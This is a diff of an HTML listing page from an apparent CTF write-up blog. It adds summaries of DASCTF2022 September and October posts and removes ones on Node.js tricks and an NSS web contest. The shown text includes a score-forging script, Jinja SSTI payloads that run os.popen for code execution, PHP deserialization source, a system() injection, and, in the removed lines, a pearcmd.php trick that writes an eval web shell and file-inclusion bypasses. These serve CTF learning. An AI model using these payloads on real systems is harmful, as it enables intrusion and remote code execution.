@@ -110,6 +110,30 @@
         alt="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp"
         title="https://www.gravatar.com/avatar/aa99b351245441b8ca95d54a52d2998c?s=240&amp;d=mp" /></a></div><h1 class="home-title">ThnPinkman's blog</h1><div class="home-subtitle"><div id="id-1" class="typeit"></div></div><div class="links"></div></div>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/">DASCTF2022九月赛</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">dino3d 一个前端小游戏
+抓包 看到/check.php 和 post 的参数，是score我们要够1000000，后面的checkCode和tm应该也要构造
+翻js源码，美化一下
+找sn() ，发现e就是source，t=checkCode ，source随便我们写
+找checkCode ，DASxCBCTF_wElc03e
+可以构造了，写个脚本
+import time import hashlib import requests url = &#34;http://node4.buuoj.cn:28130/check.php&#34; score = &#39;1000000&#39; code= &#39;DASxCBCTF_wElc03e&#39; checkCode = hashlib.md5((score+code).encode()).hexdigest() tm = int(str(time.time())[0:10]) #这里最终要为int,否则脚本跑的不好 data = { &#39;score&#39; : score, &#39;checkCode&#39; : checkCode, &#39;tm&#39; : tm } print(checkCode) print(tm) res = requests.post(url=url,data=data) print(res.text) Text Reverser SSTI 加上 一个文本逆转
+过滤了{{}} 可以试试{%print(1)%}
+进行逆转然后传参 有返回值1
+可以利用 {%print(1)%} 来进行payload构造
+lipsum这条路真的很方便
+{{lipsum.__globals__[&#39;os&#39;].popen(&#39;whoami&#39;).read()}}{{lipsum.__globals__.os.popen(&#39;whoami&#39;).read()}}{{lipsum.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&#34;)}} 直接就rce 了</div><div class="post-footer">
+        <a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
+        <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">DASCTF2022十月赛</a>
+    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
+</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">EasyPOP 源码附上
+&lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = &#34;&#34;; die(&#34;Go listen to Jay Chou&#39;s secret-code! Really nice&#34;); } } class show { public $ctf; public $time = &#34;Two and a half years&#34;; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf .</div><div class="post-footer">
+        <a href="/posts/ctf/dasctf2022%E5%8D%81%E6%9C%88%E8%B5%9B/">Read More</a><div class="post-tags">
+                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
+</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
         <a href="/posts/ctf/dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B/">Dest0g3 520迎新赛</a>
     </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
 </span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">web phpdest 日志包含 &lt;?php highlight_file(__FILE__); require_once &#39;flag.php&#39;; if(isset($_GET[&#39;file&#39;])) { require_once($_GET[&#39;file&#39;]); } 倒是很久没有写日志包含了
@@ -151,39 +175,6 @@ num=2077abc
 &amp;cmd=%0dsystem(&quot;ls /&quot;); 在bp里需要URL编码进去rec</div><div class="post-footer">
         <a href="/posts/ctf/newstarctf-web/">Read More</a><div class="post-tags">
                 <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/nodejs/">nodejs</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">前言：非常感谢F1veseven师傅的博客分享，本篇文章是在师傅分享的基础上，希望总结出一篇更全的姿式库供以后的比赛使用。
-nnodejs语言的缺点 大小写特性 toUpperCase()toLowerCase()对于toUpperCase(): 字符`&#34;ı&#34;`、`&#34;ſ&#34;` 经过toUpperCase处理后结果为 `&#34;I&#34;`、`&#34;S&#34;`对于toLowerCase(): 字符`&#34;K&#34;`经过toLowerCase处理后结果为`&#34;k&#34;`(这个K不是K) 例题：ctfshow 334 打开题目是一个登录界面，阅读源码，这里贴出关键代码
-module.exports = { items: [ {username: &#39;CTFSHOW&#39;, password: &#39;123456&#39;} ] }; var findUser = function(name, password){ return users.find(function(item){ return name!==&#39;CTFSHOW&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; }); }; 这题感觉题面有问题，考点没考到，输入小写的ctfshow和123456即可登录获得flag。
-将题面改成这样又该如何绕过呢？
-return name!==&#39;ctfshow&#39; &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password; js中有大小写特性
-这题刚好用到了类s字符，输入 ctfſhow/123456。成功登录
-弱类型比较 大小比较
-console.log(1==&#39;1&#39;); //true console.log(1&gt;&#39;2&#39;); //false console.log(&#39;1&#39;&lt;&#39;2&#39;); //true console.log(111&gt;&#39;3&#39;); //true console.log(&#39;111&#39;&gt;&#39;3&#39;); //false console.</div><div class="post-footer">
-        <a href="/posts/ctf/nodejs/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/nodejs/">Nodejs</a></div></div>
-</article><article class="single summary" itemscope itemtype="http://schema.org/Article"><h1 class="single-title" itemprop="name headline">
-        <a href="/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/">NSS#roun8 web专项赛</a>
-    </h1><div class="post-meta"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Author</a>
-</span>&nbsp;<span class="post-publish">published on <time datetime="2024-08-20">2024-08-20</time></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Ctf</a></span></div><div class="content">MyPage Where is my page？
-拿到题目就是这个样子
-感觉就是文件包含
-可以读取，可以用filter协议
-但是index.php怎么尝试都没读取到,data和input等协议都被ban了
-方法一： pearcmd.php filter读取不到index.php，可以试试pearcmd.php的姿势写shell
-index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php 利用文件包含漏洞包含这个文件即可
-方法二：多级连接绕过 /proc/self/root/多级连接绕过 include_once
-?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php ?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/flag.php 注意最后是proc/self/cwd/
-index.php源码是
-&lt;?php error_reporting(0); include &#39;flag.php&#39;; if(!isset($_GET[&#39;file&#39;])) { header(&#39;Location:/index.php?file=&#39;); } else { $file = $_GET[&#39;file&#39;]; if (!preg_match(&#39;/\.\.|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#39;, $file)) { include_once $file; } else { die(&#39;error.&#39;); } } include_once 不能重复包含,然后上面已经有include 'flag.php' 包含了，所以读不到flag.php
-至于不能正常读到index.php我比较迷惑，应该是执行这个文件其实已经算包含一遍了，也是include_once的问题，换成include就可以正常读。
-/proc/self/root/多级连接绕过原理可参考此文
-require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Filter 宽松解析 我在写这题时候 用了这个方法，不过payload生成可能产生一点问题,复现倒是很顺
-&lt;?php $base64_payload = &#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;; /* &lt;?=`$_GET[0]`;;?&gt; */ $conversions = array( &#39;R&#39; =&gt; &#39;convert.</div><div class="post-footer">
-        <a href="/posts/ctf/nss%23roun8-web%E4%B8%93%E9%A1%B9%E8%B5%9B/">Read More</a><div class="post-tags">
-                <i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></div></div>
 </article><ul class="pagination"><li class="page-item ">
                     <span class="page-link">
                         <a href="/">1</a>
@@ -209,8 +200,10 @@ require_once 绕过不能重复包含文件的限制方法三： PHP Base64 Fil
                         <a href="/page/6/">6</a>
                     </span>
                 </li><li class="page-item ">
+                    <span class="page-link" aria-hidden="true">&hellip;</span>
+                </li><li class="page-item ">
                     <span class="page-link">
-                        <a href="/page/7/">7</a>
+                        <a href="/page/8/">8</a>
                     </span>
                 </li></ul></div></div>
             </main><footer class="footer">
